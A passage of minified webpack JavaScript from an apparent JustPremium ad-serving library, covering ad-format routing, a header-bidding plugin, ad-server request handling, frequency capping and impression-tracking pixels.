                if (t.wp || t.to) return !0;
            }
            return !1;
          }, e.prototype._extendScope.call(this, t);
        }, t.execute = function (e) {
          new t(e).sandbox("");
        }, t.prototype.setDependency = function (e, t) {
          return a.get(this).di[e] = t, this.publish(e + "DependencySet", [t]), this;
        }, t;
      }(r.default));
    t.default = s;
  },
  561: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var r = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      },
      o = (s(n(79)), s(n(32)), s(n(106))),
      i = s(n(4)),
      u = s(n(16)),
      a = s(n(55));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function c(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var n = Object.getOwnPropertyNames(t), r = 0; r < n.length; r++) {
          var o = n[r],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var l = new WeakMap();
    var p = function (e) {
      function t(n) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, t);
        var r = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this)),
          o = r,
          i = {},
          u = (n = n || {}).di || {};
        return l.set(o, i), i.di = u, r;
      }
      return c(t, e), t.navigate = function (e) {
        if (u.default.info("JExecution: Routing product base on product."), "to" !== e.format) return a.default.run(e), !1;
        var n = e.di;
        u.default.info("JExecution: TakeOver format detected and installed.");
        var i = {
            model: {
              creative: r({}, e.model.creative),
              inline: e.product.inline,
              outline: n.window.Jpx && n.window.Jpx.modules ? n.window.Jpx.modules.product.to : {}
            }
          },
          s = n.Jpx.To.To,
          c = s.getModel(i),
          l = new o.default({
            di: {
              window: n.window
            }
          });
        c.getJSON().then(function () {
          var r = s.factory({
            di: {
              jDOM: l,
              jModel: c,
              constructor: s
            }
          });
          s.getCompatibilityAdapter({
            di: {
              jProduct: r,
              jModel: c
            },
            options: i
          }), t.route(e, n.Jpx, c, e.product), r.check();
        });
      }, t.route = function (e, t, n, r) {
        var o = e.global.site ? e.global.site.width : 0,
          i = n.getData("config");
        return Array.from([{
          code: "wp",
          alias: "wp/wv",
          requires: {
            siteWidth: !0,
            init: !0
          }
        }]).forEach(function (n) {
          var s = n.alias,
            c = n.code,
            l = n.requires;
          if (l.siteWidth && !o) return u.default.warn("JRouter: There is no site width for " + n.alias + "."), "inline";
          if (l.init && (!r.inits[s] || !r.inits[s].product || !r.inits[s].site)) return u.default.warn("JRouter: There is no product or site init for " + n.alias + "."), "inline";
          if (i[c]) {
            var p = function (e) {
              return e.charAt(0).toUpperCase() + e.slice(1);
            }(c);
            if (t[p] = t.To[p], !t[p]) return "inline";
            e.format = c, e.model.format = c, e.product.inits.site = e.product.inits[s].site, e.product.inits.product = e.product.inits[s].product, e.product.type = e.product.settings[s].type, e.product.destination = e.product.settings[s].destination, e.product.limits = e.product.settings[s].limits, a.default.run(e);
          }
        }), "inline";
      }, t;
    }(i.default);
    t.default = p;
  }
}, [557]);
this.Jpx = this.Jpx || {}, this.Jpx.PluginBidder = webpackJsonpJpx__name_([22], {
  568: function (e, t, r) {
    "use strict";

    e.exports = r(569).default;
  },
  569: function (e, t, r) {
    "use strict";

    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = function () {
          return function (e, t) {
            if (Array.isArray(e)) return e;
            if (Symbol.iterator in Object(e)) return function (e, t) {
              var r = [],
                n = !0,
                o = !1,
                i = void 0;
              try {
                for (var a, d = e[Symbol.iterator](); !(n = (a = d.next()).done) && (r.push(a.value), !t || r.length !== t); n = !0);
              } catch (e) {
                o = !0, i = e;
              } finally {
                try {
                  !n && d.return && d.return();
                } finally {
                  if (o) throw i;
                }
              }
              return r;
            }(e, t);
            throw new TypeError("Invalid attempt to destructure non-iterable instance");
          };
        }(),
        o = l(r(91)),
        i = l(r(33)),
        a = l(r(16)),
        d = l(r(1)),
        s = l(r(55)),
        c = l(r(171)),
        u = l(r(85));
      function l(e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }
      function p(e, t) {
        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
        e.prototype = Object.create(t && t.prototype, {
          constructor: {
            value: e,
            enumerable: !1,
            writable: !0,
            configurable: !0
          }
        }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
          for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
            var o = r[n],
              i = Object.getOwnPropertyDescriptor(t, o);
            i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
          }
        }(e, t));
      }
      var f = new WeakMap(),
        g = d.default.getTopScope(),
        b = function (t) {
          function r(e) {
            !function (e, t) {
              if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
            }(this, r);
            var n = function (e, t) {
                if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                return !t || "object" != typeof t && "function" != typeof t ? e : t;
              }(this, t.call(this)),
              o = n,
              i = {};
            return i.parent = e.di.jAdManager, i.zones = {}, i.executed = [], i.matchingPixel = {}, i.ias = {}, f.set(o, i), n;
          }
          return p(r, t), r.prototype._execute = function (e, t) {
            var n = this,
              o = f.get(n),
              i = r.getExecution({
                di: {
                  localWindow: t || window,
                  window: g,
                  Jpx: window.Jpx || g.Jpx,
                  jPlugin: n,
                  isVast: !!e.model.creative.vast
                }
              });
            i.subscribe("dependenciesReady", function (e) {
              o.parent.publish("adReady", e);
            }), e.global = o.zones[e.model.zoneId].settings, e.model.price = parseInt(1e3 * e.model.floorprice), e.model.integration = "hb", o.parent.loadFormat(e.format).then(function () {
              return i.run(e);
            }).catch(function (r) {
              if (299 === r.code) return "wp" === e.format && (e.format = "wv"), void n._execute(e, t);
              n.publish("error", [r, e]), a.default.error("JAdManager: Loading some resources failed."), console.error(r);
            });
          }, r.prototype._executePixel = function (e) {
            var t = f.get(this),
              n = g.document.body,
              o = t.zones[e].settings;
            if (!o.server.pixel) return !1;
            if (t.matchingPixel[e]) return !1;
            var i = r._createIframe();
            i.style.height = 0, i.style.width = 0, i.style.visibility = "hidden", i.style.overflow = "hidden", i.setAttribute("src", o.server.pixel), n.appendChild(i), a.default.info("JPluginBidder: Matching pixel executed.");
          }, r.prototype._saveVersion = function (e) {
            e && function (e, t, r) {
              var n = "";
              if (r) {
                var o = new Date();
                o.setTime(o.getTime() + 24 * r * 60 * 60 * 1e3), n = "; expires=" + o.toUTCString();
              }
              document.cookie = e + "=" + t + n + "; path=/";
            }("jpxhbjs", e, 1);
          }, r.prototype._getAds = function (e) {
            var t = f.get(this),
              r = [].concat.apply([], Object.keys(t.zones).map(function (e) {
                return t.zones[e].ads;
              }));
            return e ? r.filter(function (t) {
              return t.model.zoneId == e;
            }) : r;
          }, r.prototype._notifyAboutConflict = function (e) {
            var t = e.ads && e.ads.length ? e.ads.map(function (e) {
                return e.model.adId;
              }) : [],
              r = u.default.factory("bidder", "berr", {}, {}, "Other zone already loaded.");
            return r.ssp = t.map(function (e) {
              return 22;
            }).join(","), r.adId = t.join(","), i.default.instance().trackRaw(r), a.default.info("JAdManager: other zone already loaded"), !1;
          }, r.prototype.getAdditionalTrackingData = function () {
            return {
              ias: f.get(this).ias
            };
          }, r.prototype.getAds = function () {
            return this._getAds();
          }, r.prototype.execute = function (t, r, n) {
            var o = this._getAds().find(function (e) {
              return e.model.sourceId == t;
            });
            if (!o) return i.default.instance().track("bidder", "berr", e, {}, "No ad with source " + t + " found."), !1;
            try {
              r && (o.model.prerendered = r), this._execute(o, n);
            } catch (t) {
              console.error(t), i.default.instance().track("bidder", "berr", e, {}, t.toString());
            }
          }, r.prototype.renderAd = function (e, t, r) {
            return this.execute(e, t, r);
          }, r.prototype.loadBid = function (e) {
            var t = this,
              r = f.get(t),
              n = e.server,
              o = e.tag.zoneid;
            e.ias && (r.ias = e.ias), n && a.default.debug(n.debug), t._addExecutedAd(e), e.creative.vast && (e.html = e.vast);
            var i = {
              format: e.format,
              model: {
                prerendered: e.prerendered,
                format: e.format,
                adunitid: e.adunitid,
                creative: {
                  html: decodeURIComponent(e.creative.html)
                },
                reqId: e.reqId,
                zoneId: e.tag.zoneid,
                adId: e.adId,
                ssp: e.ssp,
                isTest: e.isTest,
                sourceId: e.sourceId,
                options: e.options,
                dealId: e.dealId,
                floorprice: e.cpm || e.floorprice
              },
              product: {
                inits: {
                  cls: e.inits.cls,
                  product: e.inits.product,
                  site: e.inits.site
                },
                settings: {
                  product: e.settings.product
                },
                height: e.height,
                width: e.width
              }
            };
            e.creative.vast && (i.model.creative.vast = decodeURIComponent(e.creative.vast), i.model.creative.vastRaw = decodeURIComponent(e.creative.vast)), t._saveVersion(n.adpVer), r.parent.setGlobals(n.device || "desktop", "");
            var d = r.zones[o] = {
              ads: [i],
              inits: {
                global: ""
              },
              device: {
                type: n.device
              },
              settings: {
                site: e.settings.site,
                server: n,
                cmp: e.cmp,
                geo: e.geo
              }
            };
            return a.default.info("JPluginBidder: bid for zone " + o + " loaded"), t.publish("bidLoaded:" + e.tag.zoneid, [t, o, e, d.settings]), t;
          }, r.prototype.loadTag = function (e, t) {
            var r = this,
              n = f.get(r),
              o = t.settings;
            if (g._jpx_loaded) return r._notifyAboutConflict();
            if (o.server && a.default.debug(o.server.debug), n.zones[e]) {
              var d = t.ads && t.ads.length ? t.ads.map(function (e) {
                  return e.model.adId;
                }) : [],
                s = u.default.factory("bidder", "berr", o, null, "Zone already loaded.");
              return s.ssp = d.map(function (e) {
                return 22;
              }).join(","), s.adId = d.join(","), s.zoneId = e, i.default.instance().trackRaw(s), a.default.info("JAdManager: zone " + e + " already loaded");
            }
            return n.zones[e] = t || {
              settings: {}
            }, r._saveVersion(t.adpVer || t.apdVer), r._executePixel(e), n.parent.setGlobals(o && o.device && o.device.type || "desktop", o && o.inits && o.inits || ""), a.default.info("JPluginBidder: zone " + t.settings.server.zone + " loaded"), r.publish("tagLoaded:" + e, [r, e, t.settings]), r;
          }, r.prototype.hasAd = function (e) {
            this._config = this._config || {};
            var t = this._config,
              r = [];
            for (var n in t) t.hasOwnProperty(n) && (r = r.concat(t[n].ads));
            return r.find(function (t) {
              return t.model.adId === e;
            });
          }, r.prototype._prepareExecutionTracking = function (e) {
            var t = this,
              r = f.get(t),
              o = e.di.jExecution;
            return o.subscribe("afterProductShow", function (e) {
              var n = e[2],
                o = r.zones[n.getData("zoneId")].settings;
              n.addProperty("displayedAds", t.getDisplayedAds()), i.default.instance().track("bidder", "bsh", o, n);
            }), o.subscribe("execError", function (e) {
              var t = e[0],
                n = e[1],
                o = r.zones[n.getData("zoneId")].settings;
              i.default.instance().track("bidder", "berr", o, n, t.code || t.message || "Execution error.", t.stack);
            }), o.subscribe("executionFailure", function (e) {
              var t = e[0],
                n = e[1],
                o = r.zones[n.getData("zoneId")].settings;
              i.default.instance().track("bidder", "berr", o, n, t.code || t.message || "Execution error.", t.stack);
            }), o.subscribe("apiExecError", function (e) {
              var t = e[0],
                n = e[1],
                o = r.zones[n.getData("zoneId")].settings;
              i.default.instance().track("bidder", "berr", o, n, t.code || t.message || "Execution error.", t.stack);
            }), o.subscribe("extendExecutionDetected", function (e) {
              var t = n(e, 2),
                a = (t[0], t[1]),
                d = JSON.parse(JSON.stringify(a.getData()));
              d.singleTag = !0, d.zoneId = parseInt(d.extendTag);
              var s = r.zones[a.getData("zoneId")].settings;
              a.addProperty("isAdv", !0), d.isAdv = !0, d.trackerId ? a.addProperty("trackerId", d.trackerId) : d.pubIO ? a.addProperty("pubIO", d.pubIO) : (a.addProperty("pubIO", 0), d.pubIO = 0), a.addProperty("campaignId", d.campaignId), a.addProperty("creativeId", d.creativeId), a.addProperty("exchangeId", d.exchangeId), a.addProperty("insertionOrderId", d.insertionOrderId), a.addProperty("dealId", d.dealId), a.addProperty("publisherId", d.publisherId), a.addProperty("sourceUrl", d.sourceUrl), a.addProperty("userDefined", d.userDefined), i.default.instance().track("extend", "eadm", s, d), o.subscribe("afterFrameWrite", function (e) {
                i.default.instance().track("extend", "eim", s, d);
              }), o.subscribe("afterProductShow", function () {
                i.default.instance().track("extend", "esh", s, d);
              });
            }), t;
          }, r.prototype.removeAdFromList = function (e) {
            var t = f.get(this);
            if (t.executed && t.executed.length > 0) {
              var r = t.executed.indexOf(e);
              -1 !== r && t.executed.splice(r, 1);
            }
          }, r.prototype.getDisplayedAds = function () {
            return f.get(this).executed;
          }, r.prototype._addExecutedAd = function (e) {
            f.get(this).executed.push(e.format);
          }, r._createIframe = function () {
            var e = document.createElement("iframe");
            return e.setAttribute("allowtransparency", !0), e.style.border = "0px", e.scrolling = "no", e;
          }, r.getExecution = function (e) {
            var t = void 0;
            return t = e.di.isVast ? new c.default(e) : new s.default(e), e.di.jPlugin._prepareExecutionTracking({
              di: {
                jExecution: t
              }
            }), t;
          }, r;
        }(o.default);
      t.default = b;
    }).call(t, r(170));
  }
}, [568]);
this.Jpx = this.Jpx || {}, this.Jpx.PluginAdserver = webpackJsonpJpx__name_([3], {
  113: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(16)),
      i = a(r(1)),
      o = a(r(4));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      s = i.default.getTopScope(),
      l = function (e) {
        function t() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var r = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          if (r.record = null, r.jsonp = !1, r.write = !1, r.multi = !1, void 0 === r.run) throw r.error(104, {
            method: "run",
            class: "JCaller"
          });
          if (void 0 === r.after) throw r.error(104, {
            method: "after",
            class: "JCaller"
          });
          if (void 0 === r.before) throw r.error(104, {
            method: "before",
            class: "JCaller"
          });
          if (void 0 === r.request) throw r.error(104, {
            method: "request",
            class: "JCaller"
          });
          return c.set(r, {}), r;
        }
        return u(t, e), t.prototype.getUrl = function (e) {
          return "";
        }, t.prototype.setGlobals = function (e) {
          return c.get(this).settings = e, this;
        }, t.prototype.getGlobals = function () {
          return c.get(this).settings;
        }, t.prototype.isWrite = function () {
          return this.write;
        }, t.prototype.isJsonp = function () {
          return this.jsonp;
        }, t.prototype.JSONPRequest = function (e, t, r) {
          var n = s.document,
            i = n.createElement("script"),
            o = n.getElementById("jpx_0x000000_caller_window"),
            a = "jpx_" + +new Date() + "_" + parseInt(9900 * Math.random() + 100) + "_callback",
            u = (28 !== t ? e : e = e.replace("%callback_uid%", r[0].callbackId)) + "&callback=" + a;
          i.async = !0, i.src = u;
          var c = this.getGlobals();
          return new Promise(function (e, u) {
            var l = void 0;
            try {
              l = JSON.parse(window.localStorage.getItem("jpx_offline_callback_content_" + c.server.zone));
            } catch (e) {}
            window.navigator.onLine || null === l || "preview" !== s.location.hostname.split(".").shift() ? (s[a] = function (n) {
              if (window.navigator.onLine && "preview" === s.location.hostname.split(".").shift()) try {
                window.localStorage.setItem("jpx_offline_callback_content_" + c.server.zone, JSON.stringify(n));
              } catch (e) {}
              e({
                response: n,
                ssp: t,
                records: r
              }), delete s[a];
            }, i.onerror = function (e) {
              u("JQueue: script failed to load");
            }, (o || n.body).appendChild(i)) : e({
              response: l,
              ssp: t,
              records: r
            });
          });
        }, t.prototype.XHRequest = function (e, t, r) {
          return new Promise(function (o, a) {
            var u = null;
            "withCredentials" in (u = i.default.isOldIE() ? new window.XDomainRequest() : window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP")) && (u.withCredentials = !0);
            var c = void 0,
              s = function (e) {
                a(e);
              };
            return u.open("GET", e, !0), u.onload = function () {
              if (4 !== u.readyState) return s(new Error("ReadyState error", 404)), !1;
              if (200 !== u.status) return s(new Error("Request error", u.status)), !1;
              try {
                c = JSON.parse(u.responseText), o({
                  response: c,
                  ssp: t,
                  records: r
                });
              } catch (e) {}
            }, u.onprogress = function (e) {
              var r = e.total || 100,
                i = (e.loaded || 100) / r,
                o = void 0;
              o = i < 1 ? "Caller: SSP ID " + t + " -> loading (" + parseInt(100 * i) + "%) a remote data via XHR..." : "Caller: SSP ID " + t + " -> loading done.", n.default.info(o);
            }, u.onerror = s, u.send(), u;
          });
        }, t.isMulti = function (e) {
          return !1;
        }, t.factory = function () {
          return new t();
        }, t;
      }(o.default);
    t.default = l;
  },
  217: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(4)),
      i = a(r(208)),
      o = a(r(582));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      s = void 0,
      l = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n;
          return c.set(i, {
            item: {}
          }), n;
        }
        return u(t, e), t.prototype.validate = function (e) {
          var t = c.get(this),
            r = "i-" + e.zoneId,
            n = "a-" + e.adId,
            a = e.viewsTime,
            u = 0 === a ? o.default.read(r) : i.default.read(r);
          return !u || (t.item = u, u.v ? "v2.44.492" !== u.v ? (t.item = {}, !0) : !u[n] || (!1 !== u[n].expires && new Date().getTime() > u[n].expires ? (u[n] = null, t.item = u, !0) : u[n].expiry !== a ? (u[n] = null, t.item = u, !0) : u[n].views < e.views) : (t.item = {}, !0));
        }, t.prototype.impression = function (e) {
          var t = "i-" + e.zoneId,
            r = c.get(this),
            n = "a-" + e.adId,
            a = e.viewsTime,
            u = (0 === a ? o.default.read(t) : i.default.read(t)) || {},
            s = {
              expiry: a,
              expires: 0 !== a && new Date().getTime() + 36e5 * a,
              views: 1,
              viewsMax: e.views
            };
          r.item || (r.item = u);
          var l = !0;
          if (0 === e.views) return !1;
          r.item.v = "v2.44.492", r.item[n] || (r.item[n] = s, l = !1), l && r.item[n].views++, 0 === a ? o.default.save(t, r.item) : i.default.save(t, r.item);
        }, t.instance = function (e) {
          return s || (s = new t(e));
        }, t;
      }(n.default);
    t.default = l;
  },
  572: function (e, t, r) {
    "use strict";

    e.exports = r(573).default;
  },
  573: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
        return function (e, t) {
          if (Array.isArray(e)) return e;
          if (Symbol.iterator in Object(e)) return function (e, t) {
            var r = [],
              n = !0,
              i = !1,
              o = void 0;
            try {
              for (var a, u = e[Symbol.iterator](); !(n = (a = u.next()).done) && (r.push(a.value), !t || r.length !== t); n = !0);
            } catch (e) {
              i = !0, o = e;
            } finally {
              try {
                !n && u.return && u.return();
              } finally {
                if (i) throw o;
              }
            }
            return r;
          }(e, t);
          throw new TypeError("Invalid attempt to destructure non-iterable instance");
        };
      }(),
      i = g(r(91)),
      o = g(r(574)),
      a = g(r(55)),
      u = g(r(583)),
      c = g(r(585)),
      s = g(r(33)),
      l = g(r(217)),
      d = g(r(2)),
      p = g(r(1)),
      f = (g(r(85)), g(r(587))),
      h = g(r(171));
    function g(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function y(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var v = new WeakMap(),
      m = p.default.getTopScope(),
      b = [10386, 25709, 25710, 28835, 28836, 28837, 28838, 33306, 33310, 33707, 39822, 39823, 39824, 39827, 40642, 40644, 40645, 43943, 34698, 34699, 34700, 34701, 34704, 34705, 34706, 34707],
      w = ["adnxs.net"],
      j = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            i = n,
            a = {};
          return a.parent = r.di.jAdManager, v.set(i, a), a.di = r.di, a.di.jQueue = o.default.factory({
            di: {
              JPlugin: t,
              jPlugin: i,
              jAdManager: r.di.jAdManager
            }
          }), a.ads = {}, a.timeout = null, a.settings = {}, a.multiCallerTrackingSet = {}, a.readAds = [], a.executed = [], a.alreadyRunning = !1, a.tagLoaded = !1, a.syncFrameLoaded = !1, i._prepareCallerDiv(), i._prepareQueueTracking(), n;
        }
        return y(t, e), t.prototype._addExecutedAd = function (e) {
          v.get(this).executed.push(e);
        }, t.prototype._prepareCallerDiv = function () {
          var e = "jpx_0x000000_caller_window",
            t = m.document,
            r = void 0;
          if (!t.getElementById(e)) {
            var n = function () {
              (r = t.createElement("DIV")).setAttribute("id", e), r.style.display = "none", r.style.visibility = "hidden", t.body.appendChild(r);
            };
            if (t.body) n();else {
              t.addEventListener("DOMContentLoaded", function e() {
                t.removeEventListener("DOMContentLoaded", e, !1), n();
              }, !1);
            }
          }
        }, t.prototype._prepareCallerTracking = function (e) {
          var t = this,
            r = v.get(t),
            n = r.settings,
            i = e.di.jCaller,
            o = r.readAds;
          i.constructor.isMulti() && r.multiCallerTrackingSet[i.getId()] || (i.constructor.isMulti() && (r.multiCallerTrackingSet[i.getId()] = !0), i.subscribe("xhrError", function (e) {
            var t = e[1];
            s.default.instance().track("adserver", "er", n, {
              zoneId: n.server.zone,
              adId: t.map(function (e) {
                return e.adId;
              }).join(","),
              ssp: t.map(function (e) {
                return e.ssp;
              }).join(","),
              format: t.map(function (e) {
                return e.format;
              }).join(","),
              sourceId: t.map(function (e) {
                return e.sourceId;
              }).join(","),
              adunitid: t.map(function (e) {
                return e.adunitid;
              }).join(","),
              isTest: t.map(function (e) {
                return e.isTest;
              }).join(",")
            }, 221, e && e.length && e[2] && e[2].stack);
          }), i.subscribe("run", function (e) {
            var i = e[1],
              a = i[0];
            ("read" === a.conn || [30, 24].indexOf(a.ssp) > -1) && (o.push.apply(o, i), r.adrTrackCall || (r.adrTrackCall = (d.default.delay(t, function () {
              s.default.instance().track("adserver", "adr", n, {
                zoneId: n.server.zone,
                adId: o.map(function (e) {
                  return e.adId;
                }).join(","),
                ssp: o.map(function (e) {
                  return e.ssp;
                }).join(","),
                format: o.map(function (e) {
                  return e.format;
                }).join(","),
                sourceId: o.map(function (e) {
                  return e.sourceId;
                }).join(","),
                adunitid: o.map(function (e) {
                  return e.adunitid;
                }).join(","),
                isTest: o.map(function (e) {
                  return e.isTest;
                }).join(",")
              });
            }, 60), !0)));
          }));
        }, t.prototype._prepareExecutionTracking = function (e) {
          var t = this,
            r = this,
            i = v.get(r),
            o = i.settings,
            a = e.di.jExecution;
          a.subscribe("asyncWriteAdStart", function (e) {
            var t = e[1];
            s.default.instance().track("adserver", "adr", o, t);
          }), a.subscribe("asyncWriteAdShown", function (e) {
            var r = e[1],
              n = r.getData("zoneId"),
              a = r.getData("adId");
            s.default.instance().externalTrack("impression", i.settings.impUrl + "/adserve/impression?zone=" + n + "&adid=" + a + "&rid=" + o.server.ruid), s.default.instance().track("adserver", "im", o, r, null, null, t.getAdditionalTrackingData());
          }), a.subscribe("writeAdScannerStart", function (e) {
            var t = e[2];
            s.default.instance().track("adserver", "adw", o, t);
          }), a.subscribe("servedFromCache", function (e) {
            var t = e[1];
            s.default.instance().track("adserver", "ce", o, t);
          }), a.subscribe("writeAdFound", function (e) {
            var t = e[2],
              r = t.getData("zoneId"),
              n = t.getData("adId");
            t.getData("tracking.backoffice1") && s.default.instance().externalTrack("impression", t.getData("tracking.backoffice1")), t.getData("tracking.backoffice2") && s.default.instance().externalTrack("impression", t.getData("tracking.backoffice2")), t.getData("tracking.imptag") && s.default.instance().externalTrack("impression", t.getData("tracking.imptag")), s.default.instance().externalTrack("impression", i.settings.impUrl + "/adserve/impression?zone=" + r + "&adid=" + n + "&rid=" + o.server.ruid + (n.nurl ? "&nurl=" + encodeURIComponent(n.nurl) : ""));
          }), a.subscribe("afterProductShow", function (e) {
            var t = e[2];
            r._addExecutedAd(t.getFormat()), t.addProperty("displayedAds", r.getDisplayedAds()), s.default.instance().track("adserver", "sh", o, t), l.default.instance().impression({
              zoneId: t.getData("zoneId"),
              adId: t.getData("adId"),
              views: t.getData("views"),
              viewsTime: t.getData("viewsTime")
            });
          }), a.subscribe("afterFrameWrite", function (e) {
            var r = e[2],
              n = e[0];
            if (!(n && n instanceof h.default) && function (e) {
              return "read" === e.getData("conn") && 1 !== parseInt(e.getData("ssp")) || "read" === e.getData("conn") && 1 === parseInt(e.getData("ssp")) && "video" === e.getData("type");
            }(r)) {
              var a, u;
              if (a = r.getData("zoneId"), u = r.getData("adId"), [32, 33, 41].indexOf(parseInt(r.getData("ssp"))) > -1) {
                var c = r.getData("creative.trackers") || [];
                c.length && c.forEach(function (e) {
                  e.impression_urls && e.impression_urls.forEach(function (e) {
                    s.default.instance().externalTrack("apn-impression", e);
                  });
                });
              }
              r.getData("tracking.backoffice1") && s.default.instance().externalTrack("impression", r.getData("tracking.backoffice1")), r.getData("tracking.backoffice2") && s.default.instance().externalTrack("impression", r.getData("tracking.backoffice2")), r.getData("tracking.imptag") && s.default.instance().externalTrack("impression", r.getData("tracking.imptag")), s.default.instance().externalTrack("impression", i.settings.impUrl + "/adserve/impression?zone=" + a + "&adid=" + u + "&rid=" + o.server.ruid), s.default.instance().track("adserver", "im", i.settings, r, null, null, t.getAdditionalTrackingData());
            }
          }), a.subscribe("extendExecutionDetected", function (e) {
            var r = n(e, 2),
              i = (r[0], r[1]),
              u = void 0;
            try {
              u = JSON.parse(JSON.stringify(i.getData()));
            } catch (e) {
              u = i.getData();
            }
            u.singleTag = !0, u.zoneId = parseInt(u.extendTag), i.addProperty("isAdv", !0), u.isAdv = !0, u.trackerId ? i.addProperty("trackerId", u.trackerId) : u.pubIO ? i.addProperty("pubIO", u.pubIO) : (i.addProperty("pubIO", 0), u.pubIO = 0), i.addProperty("campaignId", u.campaignId), i.addProperty("creativeId", u.creativeId), i.addProperty("exchangeId", u.exchangeId), i.addProperty("insertionOrderId", u.insertionOrderId), i.addProperty("dealId", u.dealId), i.addProperty("publisherId", u.publisherId), i.addProperty("sourceUrl", u.sourceUrl), i.addProperty("userDefined", u.userDefined), s.default.instance().track("extend", "eadm", o, u), a.subscribe("afterFrameWrite", function (e) {
              s.default.instance().track("extend", "eim", o, u, null, null, t.getAdditionalTrackingData());
            }), a.subscribe("afterProductShow", function () {
              s.default.instance().track("extend", "esh", o, u);
            });
          }), a.subscribe("execError", function (e) {
            var t = e[0],
              r = e[1];
            s.default.instance().track("adserver", "er", o, r, t.code || t.message || "Execution error.", t.stack);
          });
        }, t.prototype._prepareHiddenIframe = function (e) {
          var t = m.document,
            r = e.cmp && e.cmp.eu ? 1 : 0,
            n = e.cmp && e.cmp.eu ? e.cmp.consentString : "";
          if (!t.getElementById("jpx_0_pd")) {
            var i = void 0;
            i = t.getElementById("jpx_0x000000_caller_window");
            var o = "//pre.ads.justpremium.com/v/1.0/t/sync?_c=a" + Math.random().toString(36).substring(7) + Date.now();
            r && n && (o = o + "&consentString=" + encodeURIComponent(n));
            var a = t.createElement("iframe");
            a.id = "jpx_0_pd", a.height = 0, a.width = 0, a.border = "0px", a.hspace = "0", a.vspace = "0px", a.frameBorder = "0", a.style.visibility = "hidden", a.src = o, i ? i.appendChild(a) : t.appendChild(a);
          }
        }, t.prototype._prepareQueueTracking = function () {
          var e = v.get(this),
            t = v.get(this).di;
